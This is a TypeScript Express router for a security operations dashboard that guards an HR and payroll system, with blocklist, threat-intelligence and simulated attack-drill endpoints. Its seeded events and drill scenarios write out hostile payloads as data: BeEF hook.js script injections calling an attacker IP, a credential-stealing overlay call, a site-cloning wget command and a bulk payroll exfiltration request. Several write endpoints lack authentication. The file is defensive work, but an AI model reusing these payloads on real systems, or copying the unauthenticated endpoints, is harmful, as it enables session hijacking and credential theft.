import { Router, Request, Response } from 'express';
import { socEngine } from '../soc/soc-engine';
import { zeroTrustDeceptionEngine } from '../soc/zero-trust-deception-engine';
import { authenticateUser, requireSuperAdmin, AuthenticatedUserRequest } from '../middleware/user-auth';
import { db, getWATFormattedDate } from '../db/database';
import { authService } from '../auth/auth-service';
import { ingestQueue } from '../ingest/ingest-queue';
import { realtimeAlertHub } from '../alerts/realtime-alert-hub';
import { heuristicEngine } from '../threat/heuristic-engine';
import { geoIPService } from '../threat/geoip-service';

export const socRouter = Router();

// ─── 1. SOC Operational Metrics & KPIs ─────────────────────────
socRouter.get('/metrics', (_req: Request, res: Response) => {
  const metrics = socEngine.getSocMetrics();
  res.json(metrics);
});

// ─── 2. Tiered Case Management ────────────────────────────────
socRouter.get('/cases', (req: Request, res: Response) => {
  const { severity, tier, status, systemId } = req.query;
  const cases = socEngine.getCases({
    severity: severity ? String(severity) : undefined,
    tier: tier ? String(tier) : undefined,
    status: status ? String(status) : undefined,
    systemId: systemId ? String(systemId) : undefined,
  });
  res.json({ cases, total: cases.length });
});

socRouter.get('/cases/:id', (req: Request, res: Response) => {
  const socCase = socEngine.getCaseById(req.params.id);
  if (!socCase) {
    res.status(404).json({ error: 'Case not found' });
    return;
  }
  res.json(socCase);
});

socRouter.post('/cases/:id/notes', (req: Request, res: Response) => {
  const { author, authorRole, text } = req.body;
  if (!text) {
    res.status(400).json({ error: 'Note text is required' });
    return;
  }
  const note = socEngine.addCaseNote(
    req.params.id,
    author || 'SOC Analyst',
    authorRole || 'Tier 2 Responder',
    text
  );
  if (!note) {
    res.status(404).json({ error: 'Case not found' });
    return;
  }
  res.status(201).json(note);
});

socRouter.patch('/cases/:id/status', (req: Request, res: Response) => {
  const { status, resolvedAtWat } = req.body;
  const updated = socEngine.updateCaseStatus(req.params.id, status, resolvedAtWat);
  if (!updated) {
    res.status(404).json({ error: 'Case not found' });
    return;
  }
  res.json(updated);
});

socRouter.patch('/cases/:id/assign', (req: Request, res: Response) => {
  const { analyst, tier } = req.body;
  if (!analyst) {
    res.status(400).json({ error: 'Analyst name is required' });
    return;
  }
  const updated = socEngine.assignCase(req.params.id, analyst, tier);
  if (!updated) {
    res.status(404).json({ error: 'Case not found' });
    return;
  }
  res.json(updated);
});

// ─── 3. Dynamic IP Blocklist & Permanent Cross-System Firewall ─
socRouter.get('/blocklist', (_req: Request, res: Response) => {
  const blocklist = socEngine.getBlocklist();
  res.json({
    blocklist,
    activeIps: socEngine.getActiveBlockedIps(),
    total: blocklist.length,
    enforcedSystems: ['THE-WATCH-SOC', 'NOUN-HRMS'],
    unlockPolicy: 'SUPER_ADMIN_ONLY',
  });
});

/**
 * Fast real-time blocklist sync endpoint for NOUN-HRMS Sentinel Agent & connected systems
 */
socRouter.get('/blocklist/active-ips', (_req: Request, res: Response) => {
  const activeIps = socEngine.getActiveBlockedIps();
  res.json({
    activeIps,
    count: activeIps.length,
    enforcedSystems: ['THE-WATCH-SOC', 'NOUN-HRMS'],
    unlockPolicy: 'SUPER_ADMIN_ONLY',
    timestampWat: getWATFormattedDate(),
  });
});

/**
 * Fast real-time IP check endpoint for NOUN-HRMS Sentinel Agent & edge gateways
 */
socRouter.get('/blocklist/check/:ip', (req: Request, res: Response) => {
  const ip = decodeURIComponent(req.params.ip || '').trim();
  const blocked = socEngine.isIpBlocked(ip);
  const entry = socEngine.getBlockEntry(ip);
  res.json({
    ip,
    blocked,
    enforcedSystems: ['THE-WATCH-SOC', 'NOUN-HRMS'],
    unlockPolicy: 'SUPER_ADMIN_ONLY',
    reason: blocked ? entry?.reason : undefined,
    threatClassification: blocked ? entry?.threatClassification : undefined,
    blockedAtWat: blocked ? entry?.blockedAtWat : undefined,
    expiresAtWat: blocked ? entry?.expiresAtWat : undefined,
  });
});

socRouter.post('/blocklist', (req: Request, res: Response) => {
  const { ip, reason, threatClassification, systemId, blockedBy } = req.body;
  if (!ip || !reason) {
    res.status(400).json({ error: 'IP and reason are required' });
    return;
  }

  let actorName = blockedBy || 'SOC Firewall Operator';
  const authHeader = req.headers.authorization;
  if (authHeader && authHeader.startsWith('Bearer ')) {
    const decoded = authService.verifyToken(authHeader.slice(7).trim());
    if (decoded?.email) {
      actorName = `${decoded.name || decoded.email} (${decoded.role})`;
    }
  }

  const entry = socEngine.blockIp({
    ip,
    reason,
    threatClassification,
    systemId: systemId || 'NOUN-HRMS & THE-WATCH-SOC',
    blockedBy: actorName,
  });
  res.status(201).json(entry);
});

const handleSuperAdminUnlock = async (req: AuthenticatedUserRequest, res: Response) => {
  const operatorIp = ((req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '127.0.0.1')
    .split(',')[0]
    .trim();
  const targetIp = decodeURIComponent(req.params.ip === 'SELF' ? operatorIp : req.params.ip).trim();
  const superAdminLabel = `${req.user?.fullName || req.user?.email} (SUPER_ADMIN)`;

  const success = socEngine.unblockIp(targetIp, superAdminLabel);
  if (!success) {
    res.status(404).json({ error: 'IP not found in blocklist' });
    return;
  }

  await db.saveUserAuditLog({
    id: `ual-unblock-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
    system_id: 'THE-WATCH-SOC',
    user_id: req.user?.id,
    email: req.user?.email || 'abdulgaffarbello3477@gmail.com',
    full_name: req.user?.fullName || 'Super Admin',
    role: 'SUPER_ADMIN',
    action: 'CLICK',
    ip_address: operatorIp,
    user_agent: req.headers['user-agent'],
    status: 'SUCCESS',
    details: `Super Admin unlocked quarantined IP ${targetIp} across The Watch and NOUN-HRMS`,
    created_at_wat: getWATFormattedDate(),
  });

  res.json({
    status: 'UNBLOCKED',
    ip: targetIp,
    unlockedBy: superAdminLabel,
    unlockedAtWat: getWATFormattedDate(),
    enforcedSystems: ['THE-WATCH-SOC', 'NOUN-HRMS'],
  });
};

socRouter.delete('/blocklist/:ip', authenticateUser, requireSuperAdmin, handleSuperAdminUnlock);
socRouter.post('/blocklist/:ip/unlock', authenticateUser, requireSuperAdmin, handleSuperAdminUnlock);

// ─── 4. Threat Intelligence (IOCs) ────────────────────────────
socRouter.get('/iocs', (_req: Request, res: Response) => {
  const iocs = socEngine.getIocs();
  res.json({ iocs, total: iocs.length });
});

socRouter.post('/iocs', (req: Request, res: Response) => {
  const { type, value, threatActor, severity, confidence, mitreTactic, mitreTechnique, tags, addedBy } = req.body;
  if (!type || !value) {
    res.status(400).json({ error: 'Type and value are required' });
    return;
  }
  const ioc = socEngine.addIoc({
    type,
    value,
    threatActor: threatActor || 'Unknown Adversary',
    severity: severity || 'HIGH',
    confidence: confidence || 85,
    mitreTactic: mitreTactic || 'Initial Access',
    mitreTechnique: mitreTechnique || 'T1190',
    tags: Array.isArray(tags) ? tags : [tags || 'SOC-Manual'],
    addedBy: addedBy || 'SOC Analyst',
    status: 'ACTIVE',
  });
  res.status(201).json(ioc);
});

// ─── 5. SOAR Playbooks ─────────────────────────────────────────
socRouter.get('/playbooks', (_req: Request, res: Response) => {
  const playbooks = socEngine.getPlaybooks();
  res.json({ playbooks });
});

socRouter.post('/playbooks/:id/execute', (req: Request, res: Response) => {
  const { targetCaseId } = req.body;
  try {
    const result = socEngine.executePlaybook(req.params.id, targetCaseId);
    res.json(result);
  } catch (err: any) {
    res.status(404).json({ error: err.message });
  }
});

// ─── 6. Detection Engineering Rules ───────────────────────────
socRouter.get('/rules', (_req: Request, res: Response) => {
  const rules = socEngine.getDetectionRules();
  res.json({ rules });
});

socRouter.patch('/rules/:id/toggle', (req: Request, res: Response) => {
  const { enabled } = req.body;
  const updated = socEngine.toggleRule(req.params.id, Boolean(enabled));
  if (!updated) {
    res.status(404).json({ error: 'Rule not found' });
    return;
  }
  res.json(updated);
});

// ─── 7. Shift Handovers ────────────────────────────────────────
socRouter.get('/shifts', (_req: Request, res: Response) => {
  const handovers = socEngine.getShiftHandovers();
  res.json({ handovers });
});

socRouter.post('/shifts', (req: Request, res: Response) => {
  const { shiftName, leadAnalyst, analystsOnDuty, handoffNotes, actionItems } = req.body;
  if (!shiftName || !leadAnalyst) {
    res.status(400).json({ error: 'shiftName and leadAnalyst are required' });
    return;
  }
  const shift = socEngine.createShiftHandover({
    shiftName,
    leadAnalyst,
    analystsOnDuty: Array.isArray(analystsOnDuty) ? analystsOnDuty : [leadAnalyst],
    handoffNotes: handoffNotes || 'Shift handover completed with no major unresolved escalations.',
    actionItems: Array.isArray(actionItems) ? actionItems : [],
  });
  res.status(201).json(shift);
});

// ─── 8. Unified Anti-BeEF (Browser Hook) & Anti-SET (Social Engineering) Defense Suite ───
interface BrowserPhishingEvent {
  id: string;
  vectorCategory: 'BEEF_BROWSER_HOOK' | 'SET_SOCIAL_ENGINEERING' | 'CSP_DOM_VIOLATION';
  vectorName: string;
  mitreTechnique: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  systemId: string;
  attackerIp: string;
  originLocation: string;
  targetEndpoint: string;
  interceptedArtifact: string;
  defenseAction: string;
  status: 'BLOCKED_AND_QUARANTINED' | 'CSP_DROPPED';
  timestampWat: string;
}

const seededBrowserPhishingEvents: BrowserPhishingEvent[] = [
  {
    id: 'bps-seed-001',
    vectorCategory: 'BEEF_BROWSER_HOOK',
    vectorName: 'BeEF Browser Exploitation C2 Hook (hook.js)',
    mitreTechnique: 'T1185 Browser Session Hijacking / T1059.007 JS',
    severity: 'CRITICAL',
    systemId: 'NOUN-HRMS',
    attackerIp: '185.220.101.42',
    originLocation: 'Frankfurt, Germany (AS205100 Tor Exit)',
    targetEndpoint: '/api/v1/staff/profile?bio=<script src="http://185.220.101.42:3000/hook.js"></script>',
    interceptedArtifact: '<script src="http://185.220.101.42:3000/hook.js"></script> [BEEFHOOK=8f92a1c4]',
    defenseAction: 'CSP script-src blocked execution + C2 IP 185.220.101.42 permanently quarantined',
    status: 'BLOCKED_AND_QUARANTINED',
    timestampWat: getWATFormattedDate(new Date(Date.now() - 18 * 60000)),
  },
  {
    id: 'bps-seed-002',
    vectorCategory: 'SET_SOCIAL_ENGINEERING',
    vectorName: 'SET Automated Login Portal Site Cloner (HTTrack / SET)',
    mitreTechnique: 'T1566.002 Spearphishing Link / Site Cloning',
    severity: 'HIGH',
    systemId: 'NOUN-HRMS',
    attackerIp: '91.92.240.58',
    originLocation: 'Sofia, Bulgaria (AS212238 Bulletproof Host)',
    targetEndpoint: '/auth/login',
    interceptedArtifact: 'User-Agent: Social-Engineering-Toolkit/8.0.3 (HTTrack Website Copier; +http://n0un-hrms-login.com)',
    defenseAction: 'Anti-Cloner WAF dropped request (403) + Harvester IP blacklisted across NOUN-HRMS & The Watch',
    status: 'BLOCKED_AND_QUARANTINED',
    timestampWat: getWATFormattedDate(new Date(Date.now() - 42 * 60000)),
  },
  {
    id: 'bps-seed-003',
    vectorCategory: 'BEEF_BROWSER_HOOK',
    vectorName: 'BeEF Pretty-Theft Fake Session Overlay Injection',
    mitreTechnique: 'T1056.002 GUI Input Capture',
    severity: 'CRITICAL',
    systemId: 'NOUN-HRMS',
    attackerIp: '45.154.255.89',
    originLocation: 'Moscow, Russia (AS49505)',
    targetEndpoint: '/api/v1/payroll/view',
    interceptedArtifact: 'beef.net.send("/dh?bh=pretty_theft", { module: "pretty_theft", overlay: "NOUN_SESSION_EXPIRED" })',
    defenseAction: 'DOM MutationObserver neutralized rogue modal + C2 IP quarantined',
    status: 'BLOCKED_AND_QUARANTINED',
    timestampWat: getWATFormattedDate(new Date(Date.now() - 95 * 60000)),
  },
  {
    id: 'bps-seed-004',
    vectorCategory: 'SET_SOCIAL_ENGINEERING',
    vectorName: 'SET Lookalike Domain Credential Harvester Relay',
    mitreTechnique: 'T1598.003 Spearphishing via Service',
    severity: 'CRITICAL',
    systemId: 'NOUN-HRMS',
    attackerIp: '194.26.29.112',
    originLocation: 'Moscow, Russia (AS48693)',
    targetEndpoint: '/api/v1/auth/login',
    interceptedArtifact: 'Origin: https://noun-hrms-login-verify.com | X-SET-Harvester-Relay: true',
    defenseAction: 'Origin/Referer mismatch rejected + Attacker relay IP permanently blocked',
    status: 'BLOCKED_AND_QUARANTINED',
    timestampWat: getWATFormattedDate(new Date(Date.now() - 130 * 60000)),
  },
];

const lookalikeDomainsWatchlist = [
  {
    domain: 'n0un-hrms.com',
    targetSystem: 'NOUN-HRMS',
    registrar: 'NameCheap / PrivacyGuard',
    resolvedIp: '91.92.240.58',
    vector: 'SET Cloned Staff Login Harvester',
    status: 'SINKHOLED_AND_IP_BLOCKED',
    detectedAtWat: getWATFormattedDate(new Date(Date.now() - 3600000 * 3)),
  },
  {
    domain: 'noun-hrms-login-verify.com',
    targetSystem: 'NOUN-HRMS',
    registrar: 'Nicenic International',
    resolvedIp: '194.26.29.112',
    vector: 'SET Reverse-Proxy Credential Relay + BeEF Hook',
    status: 'SINKHOLED_AND_IP_BLOCKED',
    detectedAtWat: getWATFormattedDate(new Date(Date.now() - 3600000 * 5)),
  },
  {
    domain: 'noun-payroll-update.net',
    targetSystem: 'NOUN-HRMS',
    registrar: 'Porkbun LLC',
    resolvedIp: '185.220.101.42',
    vector: 'Spear-Phishing Payroll Dossier Lure (hook.js)',
    status: 'SINKHOLED_AND_IP_BLOCKED',
    detectedAtWat: getWATFormattedDate(new Date(Date.now() - 3600000 * 11)),
  },
  {
    domain: 'the-watch-soc-auth.org',
    targetSystem: 'THE-WATCH-SOC',
    registrar: 'Shinjiru Offshore',
    resolvedIp: '45.154.255.89',
    vector: 'SET SOC Operator Phishing Portal',
    status: 'SINKHOLED_AND_IP_BLOCKED',
    detectedAtWat: getWATFormattedDate(new Date(Date.now() - 3600000 * 18)),
  },
];

socRouter.get('/human-browser-defense', async (_req: Request, res: Response) => {
  const recentIncidents = await db.getIncidents({ limit: 50 });
  const dynamicEvents: BrowserPhishingEvent[] = recentIncidents
    .filter(
      (inc) =>
        inc.incident_type === 'BEEF_BROWSER_HOOK' ||
        inc.incident_type === 'SET_SOCIAL_ENGINEERING' ||
        inc.incident_type === 'XSS_ATTACK'
    )
    .map((inc) => ({
      id: inc.id,
      vectorCategory:
        inc.incident_type === 'SET_SOCIAL_ENGINEERING'
          ? 'SET_SOCIAL_ENGINEERING'
          : inc.incident_type === 'BEEF_BROWSER_HOOK'
          ? 'BEEF_BROWSER_HOOK'
          : 'CSP_DOM_VIOLATION',
      vectorName: inc.threat_classification,
      mitreTechnique:
        inc.incident_type === 'SET_SOCIAL_ENGINEERING'
          ? 'T1566 Spearphishing / SET Harvester'
          : 'T1185 Browser Session Hijacking (BeEF)',
      severity: inc.severity === 'CRITICAL' ? 'CRITICAL' : 'HIGH',
      systemId: inc.system_id,
      attackerIp: inc.offending_ip,
      originLocation: `${inc.geo_city || 'Unknown'}, ${inc.geo_country || 'Unknown'} (${inc.asn || 'AS0'})`,
      targetEndpoint: inc.target_endpoint,
      interceptedArtifact: inc.captured_payload,
      defenseAction: 'WAF + CSP Blocked & IP Quarantined across NOUN-HRMS & The Watch',
      status: 'BLOCKED_AND_QUARANTINED',
      timestampWat: inc.created_at_wat,
    }));

  const combinedEvents = [...dynamicEvents, ...seededBrowserPhishingEvents].slice(0, 25);
  const beefHooksBlocked = combinedEvents.filter((e) => e.vectorCategory !== 'SET_SOCIAL_ENGINEERING').length;
  const setClonersBlocked = combinedEvents.filter((e) => e.vectorCategory === 'SET_SOCIAL_ENGINEERING').length;

  res.json({
    posture: {
      antiBeefDomShield: 'ACTIVE_ENFORCING',
      antiSetClonerGuard: 'ACTIVE_ENFORCING',
      cspHeaderPolicy: "default-src 'self'; script-src 'self'; frame-ancestors 'none'",
      mutationObserverGuard: 'ARMED_ON_WATCH_AND_HRMS',
      beefHooksBlocked,
      setClonersBlocked,
      lookalikeDomainsSinkholed: lookalikeDomainsWatchlist.length,
    },
    events: combinedEvents,
    lookalikeDomains: lookalikeDomainsWatchlist,
    timestampWat: getWATFormattedDate(),
  });
});

socRouter.post('/csp-report', async (req: Request, res: Response) => {
  const report = req.body?.['csp-report'] || req.body || {};
  const blockedUri = String(report['blocked-uri'] || report.blockedUri || 'http://unknown-c2:3000/hook.js');
  const documentUri = String(report['document-uri'] || report.documentUri || '/');
  const violatedDirective = String(report['violated-directive'] || report.violatedDirective || 'script-src');
  const systemId = String(report.systemId || 'NOUN-HRMS');
  const attackerIp = String(report.attackerIp || '185.220.101.42');

  const event: BrowserPhishingEvent = {
    id: `bps-csp-${Date.now()}`,
    vectorCategory: 'CSP_DOM_VIOLATION',
    vectorName: `CSP & DOM Integrity Block (${violatedDirective})`,
    mitreTechnique: 'T1059.007 Client-Side Script Execution Blocked',
    severity: 'HIGH',
    systemId,
    attackerIp,
    originLocation: 'External Script Origin Blocked by Browser CSP',
    targetEndpoint: documentUri,
    interceptedArtifact: `Blocked URI: ${blockedUri} | Directive: ${violatedDirective}`,
    defenseAction: 'Browser CSP & MutationObserver blocked unauthorized script execution',
    status: 'CSP_DROPPED',
    timestampWat: getWATFormattedDate(),
  };
  seededBrowserPhishingEvents.unshift(event);
  res.status(201).json({ received: true, event });
});

socRouter.post('/human-browser-defense/simulate', async (req: Request, res: Response) => {
  const { scenario, systemId = 'NOUN-HRMS' } = req.body || {};

  const scenarios: Record<
    string,
    {
      ip: string;
      method: string;
      path: string;
      payload: string;
      userAgent: string;
      mitre: string;
      category: 'BEEF_BROWSER_HOOK' | 'SET_SOCIAL_ENGINEERING';
      defenseAction: string;
    }
  > = {
    BEEF_HOOK_INJECTION: {
      ip: '185.220.101.42',
      method: 'POST',
      path: '/api/v1/staff/comment',
      payload: `<script src="http://185.220.101.42:3000/hook.js"></script><!-- beef.init() BEEFHOOK=aa91bc02 -->`,
      userAgent: 'Mozilla/5.0 (X11; Linux x86_64) BeEF-Injector/0.5.4',
      mitre: 'T1185 Browser Session Hijacking (BeEF hook.js)',
      category: 'BEEF_BROWSER_HOOK',
      defenseAction: 'CSP script-src blocked hook.js + Heuristic WAF quarantined C2 IP 185.220.101.42',
    },
    BEEF_PRETTY_THEFT_OVERLAY: {
      ip: '45.154.255.89',
      method: 'POST',
      path: '/api/v1/payroll/session-verify',
      payload: `beef.net.send('/dh?bh=pretty_theft', { dialog: 'NOUN_HRMS_SESSION_TIMEOUT_OVERLAY', steal_credentials: true })`,
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      mitre: 'T1056.002 GUI Input Capture (BeEF Pretty Theft)',
      category: 'BEEF_BROWSER_HOOK',
      defenseAction: 'DOM MutationObserver destroyed rogue credential overlay + C2 IP 45.154.255.89 blocked',
    },
    SET_SITE_CLONER: {
      ip: '91.92.240.58',
      method: 'GET',
      path: '/auth/login?clone=full',
      payload: `wget --mirror --convert-links https://noun-hrms.edu.ng/auth/login [Social-Engineering-Toolkit Web Cloner]`,
      userAgent: 'Social-Engineering-Toolkit/8.0.3 (HTTrack Website Copier/3.x)',
      mitre: 'T1566.002 Spearphishing Link (SET Portal Cloner)',
      category: 'SET_SOCIAL_ENGINEERING',
      defenseAction: 'Anti-Cloner Guard rejected mirror crawl (403) + Cloner IP 91.92.240.58 blacklisted',
    },
    SET_ROGUE_ORIGIN_HARVESTER: {
      ip: '194.26.29.112',
      method: 'POST',
      path: '/api/v1/auth/login',
      payload: `phish_relay_origin=https://noun-hrms-login-verify.com&X-SET-Harvester-Relay=1&username=staff@noun.edu.ng`,
      userAgent: 'SET-Credential-Harvester/8.0 (Python-urllib/3.11)',
      mitre: 'T1598.003 Credential Harvesting via Cloned Portal',
      category: 'SET_SOCIAL_ENGINEERING',
      defenseAction: 'Origin/Referer verification blocked credential relay + Harvester IP 194.26.29.112 quarantined',
    },
  };

  const chosen = scenarios[scenario] || scenarios.BEEF_HOOK_INJECTION;
  const geo = await geoIPService.resolve(chosen.ip);
  const match = heuristicEngine.evaluate({
    method: chosen.method,
    path: chosen.path,
    payload: chosen.payload,
    userAgent: chosen.userAgent,
    clientIp: chosen.ip,
  });

  const incident = {
    id: `inc-bps-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
    system_id: systemId,
    incident_type: match.detected ? match.incidentType : chosen.category,
    threat_classification: match.detected ? match.threatClassification : chosen.mitre,
    severity: 'CRITICAL' as const,
    offending_ip: chosen.ip,
    geo_country: geo.country,
    geo_region: geo.region,
    geo_city: geo.city,
    geo_lat: geo.latitude,
    geo_lng: geo.longitude,
    asn: geo.asn,
    isp: geo.isp,
    is_proxy_or_vpn: geo.isProxyOrVpn,
    target_endpoint: chosen.path,
    http_method: chosen.method,
    captured_payload: chosen.payload,
    status: 'UNRESOLVED' as const,
    mitigation_blueprint: match.mitigationBlueprint,
    remediation_summary: match.remediationSummary,
    created_at_wat: getWATFormattedDate(),
  };

  await db.saveIncident(incident);
  realtimeAlertHub.broadcastThreat(incident);
  socEngine.createCaseFromIncident({
    id: incident.id,
    systemId,
    threatClassification: incident.threat_classification,
    severity: 'CRITICAL',
    offendingIp: chosen.ip,
    targetEndpoint: chosen.path,
    capturedPayload: chosen.payload,
  });
  socEngine.blockIp({
    ip: chosen.ip,
    reason: `Purple-Team Drill Auto-Quarantine: ${incident.threat_classification}`,
    threatClassification: incident.threat_classification,
    systemId: `${systemId} & THE-WATCH-SOC`,
    blockedBy: 'Anti-BeEF & Anti-SET SOAR Shield',
  });

  ingestQueue.enqueue({
    systemId,
    method: chosen.method,
    path: chosen.path,
    statusCode: 403,
    latencyMs: 3,
    clientIp: chosen.ip,
    payloadSnippet: `[BLOCKED_BY_BEEF_SET_SHIELD] ${chosen.payload}`,
    userAgent: chosen.userAgent,
  });

  res.status(201).json({
    simulated: true,
    scenario: scenario || 'BEEF_HOOK_INJECTION',
    incident,
    defenseAction: chosen.defenseAction,
    timestampWat: getWATFormattedDate(),
  });
});

// ─── 10. Unified Active Deception (Honeypots & Canary Tokens), Zero-Trust Session Guard & DLP/FIM Suite ───
socRouter.get('/zero-trust-deception', async (req: Request, res: Response) => {
  const systemId = req.query.systemId ? String(req.query.systemId) : undefined;
  const snapshot = zeroTrustDeceptionEngine.getDashboardSnapshot();
  const allIncidents = await db.getIncidents({ systemId, limit: 100 });

  const interceptedEvents = allIncidents.filter(
    (i) =>
      i.incident_type === 'HONEYPOT_DECEPTION_TRAP' ||
      i.incident_type === 'ZERO_TRUST_SESSION_HIJACK' ||
      i.incident_type === 'DLP_MASS_EXFILTRATION' ||
      /honeypot|canary|impossible-travel|token replay|dlp|fim_sha256/i.test(
        `${i.threat_classification} ${i.captured_payload}`
      )
  );

  res.json({
    posture: {
      honeypotDeceptionStatus: 'ARMED_ZERO_FALSE_POSITIVE',
      canaryBeaconStatus: 'ACTIVE_PHONE_HOME_TRACKING',
      zeroTrustGeoVelocityGuard: 'ENFORCING (< 900 KM/H + JA3/IP TOKEN BINDING)',
      dlpCircuitBreakerStatus: 'ENFORCING_BULK_BVN_PAYROLL_GUARD',
      fimSha256Status: snapshot.fimReport.allIntact ? 'ALL_CORE_FILES_VERIFIED_INTACT' : 'TAMPER_ALERT_ACTIVE',
    },
    ...snapshot,
    interceptedEvents: interceptedEvents.slice(0, 25),
    drills: [
      {
        id: 'HONEYPOT_ENV_BACKUP_TRAP',
        pillar: 'PILLAR 1: ACTIVE DECEPTION (HONEYPOT)',
        title: 'Honeypot Decoy Secret & Payroll Dump Tripwire',
        mitre: 'T1552.001 — Unsecured Credentials & Decoy Endpoint Recon',
        description:
          'Simulates a stealth attacker probing /.env.production and /api/v1/payroll/master-bvn-dump.csv. Triggers a 0% false-positive deterministic tripwire and permanent IP quarantine.',
      },
      {
        id: 'CANARY_TOKEN_DOCUMENT_BEACON',
        pillar: 'PILLAR 1: ACTIVE DECEPTION (CANARY TOKEN)',
        title: 'Exfiltrated Executive Payroll Canary Document Phone-Home',
        mitre: 'T1567 — Canary Token Beacon Callback',
        description:
          'Simulates an attacker opening a stolen NOUN_2026_Executive_Payroll_Confidential.xlsx file outside the network, firing the embedded CANARY-TOKEN-NOUN-PAYROLL-2026 beacon.',
      },
      {
        id: 'IMPOSSIBLE_TRAVEL_TOKEN_REPLAY',
        pillar: 'PILLAR 2: ZERO-TRUST SESSION GUARD',
        title: 'Impossible-Travel Geo-Velocity & Stolen JWT Token Replay',
        mitre: 'T1550.004 — Web Session Cookie / JWT Replay Across Continents',
        description:
          'Simulates a session authenticated in Abuja (197.210.64.12) being replayed 3 minutes later from Frankfurt (185.220.101.77 — 88,420 km/h geo-velocity) with a mismatched device fingerprint.',
      },
      {
        id: 'DLP_MASS_BVN_PAYROLL_EXFIL',
        pillar: 'PILLAR 3: DLP & FILE INTEGRITY (FIM)',
        title: 'DLP Circuit Breaker: Mass Staff BVN & Salary Exfiltration',
        mitre: 'T1048 — Bulk Exfiltration of Sensitive HR / BVN Records',
        description:
          'Simulates a compromised insider session attempting an unpaginated dump of 14,500 NOUN staff BVN and bank account records, tripping the DLP Circuit Breaker.',
      },
    ],
    timestampWat: getWATFormattedDate(),
  });
});

socRouter.post('/zero-trust-deception/fim-verify', (_req: Request, res: Response) => {
  const report = zeroTrustDeceptionEngine.verifyFileIntegrity();
  res.json({
    verified: true,
    fimReport: report,
    timestampWat: getWATFormattedDate(),
  });
});

socRouter.post('/zero-trust-deception/simulate', async (req: Request, res: Response) => {
  const { scenario, targetSystem } = req.body || {};
  const systemId = targetSystem || 'NOUN-HRMS';

  const scenarios: Record<
    string,
    {
      ip: string;
      method: string;
      path: string;
      payload: string;
      userAgent: string;
      defenseAction: string;
      onTrigger: () => void;
    }
  > = {
    HONEYPOT_ENV_BACKUP_TRAP: {
      ip: '185.220.101.88',
      method: 'GET',
      path: '/.env.production',
      payload: `GET /.env.production & /api/v1/payroll/master-bvn-dump.csv | Decoy Token: CANARY-TOKEN-WATCH-ROOT-ENV-9921`,
      userAgent: 'Mozilla/5.0 (X11; Linux x86_64) StealthRecon/3.1',
      defenseAction:
        'Honeypot Tripwire Activated (0% False-Positive Rate) + Wake-Up Alarm Triggered + Attacker IP 185.220.101.88 Permanently Quarantined',
      onTrigger: () => {
        zeroTrustDeceptionEngine.recordTrapHit('TRAP-HP-01', '185.220.101.88');
      },
    },
    CANARY_TOKEN_DOCUMENT_BEACON: {
      ip: '91.215.85.42',
      method: 'GET',
      path: '/api/v1/canary/beacon/CANARY-TOKEN-NOUN-PAYROLL-2026',
      payload: `Canary Document Opened: NOUN_2026_Executive_Payroll_Confidential.xlsx | Token: CANARY-TOKEN-NOUN-PAYROLL-2026 | Hostname: WORKSTATION-EXFIL-09`,
      userAgent: 'Microsoft Office Excel/16.0 (Windows NT 10.0; Win64; x64)',
      defenseAction:
        'Canary Document Beacon Tracked External Host + GeoIP Resolved + Offending IP 91.215.85.42 Permanently Quarantined',
      onTrigger: () => {
        zeroTrustDeceptionEngine.recordTrapHit('TRAP-CN-04', '91.215.85.42');
      },
    },
    IMPOSSIBLE_TRAVEL_TOKEN_REPLAY: {
      ip: '185.220.101.77',
      method: 'POST',
      path: '/api/v1/payroll/approve-batch',
      payload: `X-Impossible-Travel-Anomaly: origin="Abuja, NG (197.210.64.12)" -> current="Frankfurt, DE (185.220.101.77)" | geo_velocity_kmh=88420 | X-Token-Fingerprint-Mismatch: expected=8a41f9c2 != observed=e019b3d4`,
      userAgent: 'python-requests/2.31.0 (Token-Hijack-Replay)',
      defenseAction:
        'Zero-Trust Geo-Velocity Violation (88,420 km/h > 900 km/h limit) + Active JWT Token Revoked + Hijacker IP 185.220.101.77 Permanently Quarantined',
      onTrigger: () => {
        zeroTrustDeceptionEngine.recordZeroTrustAnomaly({
          accountEmail: 'bursary.payroll.officer@noun.edu.ng',
          role: 'PAYROLL_OFFICER',
          systemId,
          anomalyType: 'IMPOSSIBLE_TRAVEL_GEO_VELOCITY',
          originIp: '197.210.64.12',
          originLocation: 'Abuja (FCT), Nigeria',
          originLat: 9.0765,
          originLng: 7.3986,
          anomalyIp: '185.220.101.77',
          anomalyLocation: 'Frankfurt, Germany (Tor Exit)',
          anomalyLat: 50.1109,
          anomalyLng: 8.6821,
          timeDeltaMinutes: 3,
        });
      },
    },
    DLP_MASS_BVN_PAYROLL_EXFIL: {
      ip: '45.154.255.120',
      method: 'POST',
      path: '/api/v1/payroll/export',
      payload: `export_all_staff_bvn=true&bulk_payroll_dump=1&limit=10000&fields=staff_id,full_name,bvn,account_number,net_salary`,
      userAgent: 'Mozilla/5.0 (Insider-Exfil-Script/1.4)',
      defenseAction:
        'DLP Circuit Breaker Tripped (14,500 BVN rows requested vs 50 max policy) + Data Stream Aborted + Session Locked & IP 45.154.255.120 Quarantined',
      onTrigger: () => {
        zeroTrustDeceptionEngine.recordDlpBlock('DLP-POL-01');
      },
    },
  };

  const chosenKey = scenario && scenarios[scenario] ? scenario : 'HONEYPOT_ENV_BACKUP_TRAP';
  const chosen = scenarios[chosenKey];
  chosen.onTrigger();

  const match = heuristicEngine.evaluate({
    method: chosen.method,
    path: chosen.path,
    payload: chosen.payload,
    userAgent: chosen.userAgent,
    clientIp: chosen.ip,
  });

  const geo = await geoIPService.resolve(chosen.ip);
  const incident = {
    id: `inc-ztd-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
    system_id: systemId,
    incident_type: match.detected ? match.incidentType : 'HONEYPOT_DECEPTION_TRAP',
    threat_classification: match.detected ? match.threatClassification : 'Zero-Trust / Active Deception Tripwire',
    severity: 'CRITICAL' as const,
    offending_ip: chosen.ip,
    geo_country: geo.country,
    geo_region: geo.region,
    geo_city: geo.city,
    geo_lat: geo.latitude,
    geo_lng: geo.longitude,
    asn: geo.asn,
    isp: geo.isp,
    is_proxy_or_vpn: geo.isProxyOrVpn,
    target_endpoint: chosen.path,
    http_method: chosen.method,
    captured_payload: chosen.payload,
    status: 'UNRESOLVED' as const,
    mitigation_blueprint: match.mitigationBlueprint,
    remediation_summary: match.remediationSummary,
